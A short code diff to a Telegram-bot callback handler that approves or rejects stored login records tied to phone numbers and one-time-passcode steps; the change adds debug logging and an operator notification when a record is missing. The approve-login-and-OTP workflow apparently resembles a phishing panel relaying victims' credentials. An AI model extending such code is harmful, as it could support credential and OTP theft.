@@ -208,7 +208,7 @@ async function handleCallback(cq) {
     const stamp = (action === 'correct' || action === 'otp_approve') ? '✅ Approved' : '❌ Rejected';
     console.log(`[${kind.toLowerCase()} callback] Received: action=${action}, id=${id}`);
     const rec = await store.get(store.NS.LOGIN, id);
-    console.log(`[${kind.toLowerCase()} callback] Record found:`, !!rec, rec?.phone);
+    console.log(`[${kind.toLowerCase()} callback] Record found:`, !!rec, rec?.phone || '(none)');
     if (rec) {
       rec.status = decision;
       rec.decided = true;
@@ -217,7 +217,13 @@ async function handleCallback(cq) {
       const verify = await store.get(store.NS.LOGIN, id);
       console.log(`[${kind.toLowerCase()} callback] Verified update:`, verify?.decided, verify?.status);
     } else {
-      console.error(`[${kind.toLowerCase()} decision] ${id} not found in ${store.usingKV ? 'kv' : 'local'} store`);
+      // Record not found - this can happen on Vercel without KV
+      // Send a notification anyway for debugging
+      console.error(`[${kind.toLowerCase()} decision] ${id} not found in store (shared=${store.shared}, kv=${store.usingKV})`);
+      tgApi('sendMessage', {
+        chat_id: CHAT_ID,
+        text: `⚠️ ${kind} verification callback received but record ${id} not found. Store shared=${store.shared}, KV=${store.usingKV}`
+      });
     }
     tgApi('answerCallbackQuery', { callback_query_id: cq.id, text: `${kind} ${decision}` });
     if (rec && rec.messageId) {
